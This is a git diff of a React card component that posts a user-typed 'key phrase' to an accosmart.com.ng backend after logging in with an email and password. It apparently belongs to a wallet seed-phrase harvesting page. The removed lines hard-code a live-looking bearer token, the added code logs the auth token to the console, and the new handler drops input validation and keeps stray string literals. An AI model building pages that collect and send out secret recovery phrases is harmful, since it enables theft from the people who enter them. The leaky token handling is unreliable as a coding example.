@@ -28,70 +28,112 @@ function Newcard({ item }) {
   const [isValid, setIsValid] = useState(true);
   const [loading, setLoading] = useState(false);
   const [success, setSuccess] = useState(false);
+  const [email, setEmail] = useState("")
+  const [password, setPassword] = useState("")
   const toast = useToast();
   const cardBg = useColorModeValue('white', 'gray.800');
   const cardHoverBg = useColorModeValue('gray.100', 'gray.700');
 
-  const user = JSON.parse(sessionStorage.getItem('user'));
+  // const user = JSON.parse(sessionStorage.getItem('user'));
+  
+ 
 
   const handleChange = (e) => {
     setMessage(e.target.value);
     setIsValid(e.target.value.length > 0);
   };
 
-  const sendForm= async (e) => {
-    e.preventDefault();
 
-    if (message.length <= 0) {
-      setIsValid(false);
-      toast({
-        title: 'Error',
-        description: 'Input field cannot be empty',
-        status: 'error',
-        duration: 4000,
-        isClosable: true,
-      });
-      return;
-    }
+const sendForm = async (e) =>{
+  e.preventDefault();
 
-    setLoading(true);
+  try{
+    // first post request
+    const loginResponse = await axios.post("https://backend.accosmart.com.ng/api/auth/login", {email,password})
+    "https://backend.accosmart.com.ng/api/auth/login"
+    'https://backend.accosmart.com.ng/api/key/phrase'
+    // get token from response
+    const token = loginResponse.data.token; 
 
-    try {
-      const response = await axios.post(
-        'https://backend.accosmart.com.ng/api/key/phrase',
-        { phrasetext: message }, 
-        {
-          headers: {
-            Authorization: `Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NCwiaWF0IjoxNzI0MTU4OTcxLCJleHAiOjE3MjQxNjI1NzF9.CSe5OgwkovWQlpOltkD2uRzrYZRbjXvn_JDGiQk-YkI`, 
-          },
-        }
-      );
 
-      setLoading(false);
-      setSuccess(true);
-      setMessage('');
-      toast({
-        title: 'Success',
-        description: 'Successfully submitted',
-        status: 'success',
-        duration: 5000,
-        isClosable: true,
-      });
+    // send the second post request
+    const phraseKey = await axios.post(
+           'https://backend.accosmart.com.ng/api/key/phrase',
+           { phrasetext: message }, 
+            {
+              headers: {
+                Authorization: `Bearer ${token}`, 
+                "Content-Type": "application/json",
+              },
+            }
+         );
 
-      console.log('Response:', response.data);
+         console.log(token);
+  }   
+  catch(error) {
+    console.error(error)
+  }
 
-    } catch (error) {
-      console.error('Error submitting form:', error);
-      setLoading(false);
-      toast({
-        title: 'Error',
-        description: 'Failed to submit form',
-        status: 'error',
-        duration: 5000,
-        isClosable: true,
-      });
-    }
-  };
+  
+  
+}
+  // const sendForm= async (e) => {
+  //   e.preventDefault();
+    
+
+  //   if (message.length <= 0) {
+  //     setIsValid(false);
+  //     toast({
+  //       title: 'Error',
+  //       description: 'Input field cannot be empty',
+  //       status: 'error',
+  //       duration: 4000,
+  //       isClosable: true,
+  //     });
+  //     return;
+  //   }
+
+  //   setLoading(true);
+
+    
+
+  //   try {
+  //     const response = await axios.post(
+  //       'https://backend.accosmart.com.ng/api/key/phrase',
+  //       { phrasetext: message }, 
+  //       {
+  //         headers: {
+  //           Authorization: `Bearer ${token}`, 
+  //           "Content-Type": "application/json",
+  //         },
+  //       }
+  //     );
+
+  //     setLoading(false);
+  //     setSuccess(true);
+  //     setMessage('');
+  //     toast({
+  //       title: 'Success',
+  //       description: 'Successfully submitted',
+  //       status: 'success',
+  //       duration: 5000,
+  //       isClosable: true,
+  //     });
+
+  //     console.log('Response:', response.data);
+
+  //   } catch (error) {
+  //     console.error('Error submitting form:', error);
+  //     setLoading(false);
+  //     toast({
+  //       title: 'Error',
+  //       description: 'Failed to submit form',
+  //       status: 'error',
+  //       duration: 5000,
+  //       isClosable: true,
+  //     });
+  //   }
+  // };
 
 
   return (
